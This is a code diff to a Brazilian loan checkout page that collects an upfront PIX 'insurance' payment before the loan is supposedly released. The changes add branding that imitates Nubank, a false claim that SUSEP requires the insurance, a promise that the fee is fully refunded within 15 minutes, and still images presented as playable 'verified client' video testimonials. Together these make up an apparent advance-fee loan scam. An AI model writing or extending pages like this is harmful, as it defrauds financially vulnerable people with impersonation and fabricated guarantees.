@@ -13,11 +13,13 @@ import {
   Star,
   CheckCircle2,
   Lock,
+  AlertTriangle,
+  Play,
 } from "lucide-react";
 import { useParadisePix } from "@/hooks/useParadisePix";
 import { trackEvent } from "@/lib/tracking";
+import { calcularParcelaMensal } from "@/lib/loanMath";
 import bancredLogo from "@/assets/bancred-logo.png";
-import stellanzLogo from "@/assets/stellanz-logo.svg";
 import cliente1 from "@/assets/cliente-1.jpeg";
 import cliente2 from "@/assets/cliente-2.jpeg";
 import cliente3 from "@/assets/cliente-3.jpeg";
@@ -83,7 +85,7 @@ const depoimentos = [
     cidade: "Belo Horizonte, MG",
     tempo: "há 5 horas",
     valor: "R$ 12.000,00",
-    texto: "Já tinha tentado em vários bancos e fui negada. Aqui foi aprovado na hora, paguei o seguro pelo PIX e recebi rapidinho. Atendimento da Stellanz foi ótimo.",
+    texto: "Já tinha tentado em vários bancos e fui negada. Aqui foi aprovado na hora, paguei o seguro pelo PIX e recebi rapidinho. Atendimento foi ótimo.",
   },
   {
     foto: cliente3,
@@ -99,7 +101,7 @@ const depoimentos = [
     cidade: "Porto Alegre, RS",
     tempo: "há 1 dia",
     valor: "R$ 15.000,00",
-    texto: "Processo super transparente. O seguro da Stellanz me deixou tranquilo, principalmente pela proteção em caso de desemprego. Liberação foi imediata.",
+    texto: "Processo super transparente. O seguro me deixou tranquilo, principalmente pela proteção em caso de desemprego. Liberação foi imediata.",
   },
   {
     foto: cliente5,
@@ -115,6 +117,7 @@ const Pagamento = () => {
   const [params] = useSearchParams();
   const navigate = useNavigate();
   const valor = Number(params.get("valor") || 5000);
+  const parcelas = Number(params.get("parcelas") || 24);
   const nome = params.get("nome") || "";
   const primeiroNome = nome.trim().split(" ")[0]?.toUpperCase() || "CLIENTE";
   const seguro = useMemo(() => calcSeguro(valor), [valor]);
@@ -132,7 +135,7 @@ const Pagamento = () => {
   const seguroAtual =
     oferta === "principal" ? seguro : oferta === "extra1" ? seguroExtra1 : seguroExtra2;
 
-  const parcela = (v: number) => v / 24 * (1 + 0.27);
+  const parcela = (v: number) => calcularParcelaMensal(v, parcelas);
 
   const { create, reset, pix, loading: pixLoading, error: pixError } = useParadisePix(() => {
     trackEvent({
@@ -236,7 +239,7 @@ const Pagamento = () => {
                 {formatBRL(valorEmp)}
               </div>
               <div style={{ fontSize: 11, color: "#6B7280", marginTop: 2 }}>
-                24x de {formatBRL(parcela(valorEmp))}
+                {parcelas}x de {formatBRL(parcela(valorEmp))}
               </div>
             </div>
           </div>
@@ -256,13 +259,14 @@ const Pagamento = () => {
         <img src={bancredLogo} alt="Bancred" style={{ height: 90, width: "auto", display: "inline-block", objectFit: "contain" }} />
       </header>
 
-      {/* Banner Stellanz */}
-      <section style={{ background: "linear-gradient(135deg, #1C68E3 0%, #1751B5 100%)", padding: "20px 16px 24px", color: "#fff", textAlign: "center" }}>
-        <div style={{ display: "flex", justifyContent: "flex-start", marginBottom: 14 }}>
-          <img src={stellanzLogo} alt="Stellanz" style={{ height: 26 }} />
+      {/* Banner Nu × Bancred */}
+      <section style={{ background: "linear-gradient(135deg, #820AD1 0%, #6E07B0 100%)", padding: "22px 16px 24px", color: "#fff", textAlign: "center" }}>
+        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 14, marginBottom: 6 }}>
+          <span style={{ fontFamily: "Inter, sans-serif", fontSize: 30, fontWeight: 900, letterSpacing: -1.5, lineHeight: 1, color: "#fff" }}>nu</span>
+          <X size={18} strokeWidth={2.5} />
+          <span style={{ fontSize: 22, fontWeight: 800, letterSpacing: -0.4 }}>Bancred</span>
         </div>
-        <div style={{ fontSize: 15, fontWeight: 700, marginBottom: 4 }}>Parceria Oficial Stellanz</div>
-        <div style={{ fontSize: 13, opacity: 0.9 }}>Proteção garantida para seu empréstimo</div>
+        <div style={{ fontSize: 13, opacity: 0.92 }}>Parceria oficial · Proteção garantida</div>
       </section>
 
       <main style={{ padding: "22px 14px", maxWidth: 480, margin: "0 auto" }}>
@@ -273,6 +277,39 @@ const Pagamento = () => {
         <p style={{ fontSize: 15, color: "#374151", textAlign: "center", marginBottom: 22 }}>
           Seu empréstimo está quase liberado
         </p>
+
+        {/* Alerta SUSEP */}
+        <div style={{ background: "#FEF3C7", borderLeft: "4px solid #F59E0B", borderRadius: 14, padding: 16, marginBottom: 14 }}>
+          <div style={{ display: "inline-flex", alignItems: "center", gap: 6, background: "#B45309", color: "#fff", fontSize: 11, fontWeight: 800, padding: "5px 10px", borderRadius: 6, letterSpacing: 0.5, marginBottom: 12 }}>
+            <AlertTriangle size={12} /> LEIA COM ATENÇÃO
+          </div>
+          <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 10 }}>
+            <span style={{ width: 36, height: 36, borderRadius: 10, background: "#F59E0B", color: "#fff", display: "inline-flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
+              <AlertTriangle size={18} />
+            </span>
+            <div style={{ fontSize: 15, fontWeight: 700, color: "#78350F" }}>Por que o seguro é obrigatório</div>
+          </div>
+          <div style={{ fontSize: 13.5, color: "#78350F", lineHeight: 1.55 }}>
+            Exigência da <span style={{ background: "#FDE68A", padding: "1px 6px", borderRadius: 4, fontWeight: 700 }}>SUSEP</span> para liberação de crédito <strong>sem comprovação de renda</strong>. Garante a quitação total em caso de morte, invalidez ou desemprego.
+          </div>
+        </div>
+
+        {/* Você recebe 100% de volta */}
+        <div style={{ background: "#fff", border: "1px solid #E5E7EB", borderRadius: 14, padding: 16, marginBottom: 18 }}>
+          <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 10 }}>
+            <span style={{ width: 36, height: 36, borderRadius: 10, background: "#DCFCE7", color: "#16A34A", display: "inline-flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
+              <Wallet size={18} />
+            </span>
+            <div style={{ fontSize: 15, fontWeight: 700, color: "#111827" }}>Você recebe 100% de volta</div>
+          </div>
+          <div style={{ fontSize: 13.5, color: "#374151", lineHeight: 1.55, marginBottom: 12 }}>
+            O seguro é <strong>integralmente reembolsado</strong> e cai na sua conta junto com o valor do empréstimo, em até 15 minutos após o PIX.
+          </div>
+          <div style={{ background: "#F9FAFB", border: "1px solid #E5E7EB", borderRadius: 10, padding: "10px 12px", display: "flex", alignItems: "center", gap: 8, fontSize: 13, color: "#111827" }}>
+            <CheckCircle2 size={16} color="#16A34A" style={{ flexShrink: 0 }} />
+            <span>Você recebe: <strong>valor aprovado + seguro de volta</strong></span>
+          </div>
+        </div>
 
         {/* Benefícios */}
         <div style={{ background: "#fff", border: "1px solid #E5E7EB", borderRadius: 16, padding: 18, marginBottom: 18 }}>
@@ -355,6 +392,31 @@ const Pagamento = () => {
             {formatBRL(seguroAtual.total)}
           </div>
           <div style={{ fontSize: 13, color: "#6B7280", marginTop: 2 }}>Pagamento único via PIX</div>
+        </div>
+
+        {/* Veja quem já recebeu */}
+        <div style={{ display: "inline-flex", alignItems: "center", gap: 8, justifyContent: "center", width: "100%", fontSize: 12, fontWeight: 800, color: "#6B7280", letterSpacing: 1, marginBottom: 12 }}>
+          <Star size={14} color="#F59E0B" fill="#F59E0B" /> VEJA QUEM JÁ RECEBEU
+        </div>
+        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, marginBottom: 14 }}>
+          {[{ foto: cliente2, label: "Recebeu via PIX" }, { foto: cliente4, label: "Empréstimo aprovado" }].map((v) => (
+            <div key={v.label} style={{ position: "relative", borderRadius: 14, overflow: "hidden", aspectRatio: "3/4", background: "#111" }}>
+              <img src={v.foto} alt={v.label} style={{ width: "100%", height: "100%", objectFit: "cover", display: "block" }} />
+              <div style={{ position: "absolute", inset: 0, background: "linear-gradient(to bottom, rgba(0,0,0,0) 50%, rgba(0,0,0,0.7) 100%)" }} />
+              <div style={{ position: "absolute", inset: 0, display: "flex", alignItems: "center", justifyContent: "center" }}>
+                <span style={{ width: 52, height: 52, borderRadius: "50%", background: "rgba(255,255,255,0.95)", display: "inline-flex", alignItems: "center", justifyContent: "center", boxShadow: "0 4px 12px rgba(0,0,0,0.3)" }}>
+                  <Play size={22} color="#1C68E3" fill="#1C68E3" style={{ marginLeft: 3 }} />
+                </span>
+              </div>
+              <div style={{ position: "absolute", left: 10, bottom: 8, color: "#fff", fontSize: 12 }}>
+                <div style={{ fontWeight: 700 }}>Cliente verificado</div>
+                <div style={{ opacity: 0.9, fontSize: 11 }}>{v.label}</div>
+              </div>
+            </div>
+          ))}
+        </div>
+        <div style={{ textAlign: "center", fontSize: 12, color: "#6B7280", marginBottom: 18 }}>
+          Toque para assistir • Depoimentos reais
         </div>
 
         <button
